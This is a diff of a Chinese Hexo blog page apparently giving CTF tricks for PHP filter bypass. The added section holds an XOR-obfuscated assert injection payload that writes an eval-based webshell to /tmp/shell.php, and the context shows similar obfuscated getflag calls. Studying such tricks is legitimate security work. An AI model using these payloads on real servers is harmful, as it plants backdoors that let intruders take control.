@@ -101,7 +101,7 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="trickphp短标签php一共支持四种标签形式  详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html 123456&amp;lt;?php ?&amp;gt;  //最常用的一种形式，不解释&amp;lt;?= ?&amp;gt;   //类似于&amp;lt;?php echo &quot;&quot;;?&amp;gt;&amp;lt;script language=php&amp;gt; &amp;lt;/script">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-09-25T13:52:15.316Z">
+<meta property="og:updated_time" content="2019-11-17T12:27:23.722Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="极限利用">
 <meta name="twitter:description" content="trickphp短标签php一共支持四种标签形式  详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html 123456&amp;lt;?php ?&amp;gt;  //最常用的一种形式，不解释&amp;lt;?= ?&amp;gt;   //类似于&amp;lt;?php echo &quot;&quot;;?&amp;gt;&amp;lt;script language=php&amp;gt; &amp;lt;/script">
@@ -362,6 +362,10 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=$&#123;<span class="string">'!:&#123;&#125;'</span>^<span class="string">'~&#125;&gt;)'</span>&#125;&#123;<span class="string">'_'</span>&#125;();&amp;_=getflag</span><br><span class="line">?a=$&#123;<span class="string">'!:&#123;&#125;'</span>^<span class="string">'~&#125;&gt;)'</span>&#125;[<span class="string">'_'</span>]();&amp;_=getflag</span><br></pre></td></tr></table></figure>
 
 <p>如果对参数有长度有限制，第二种要比第一种好一点</p>
+<p><strong>进一步</strong></p>
+<p>构造assert执行shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=file_put_contents(&apos;/tmp/shell.php&apos;,&apos;&lt;?php eval($_POST[shell]);?&gt;&apos;)</span><br></pre></td></tr></table></figure>
+
 <p>这里还有两个东西 php可变变量 复杂变量 </p>
 <p>具体参考</p>
 <p><a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.variables.variable.php</a></p>
@@ -543,7 +547,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-count">45</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
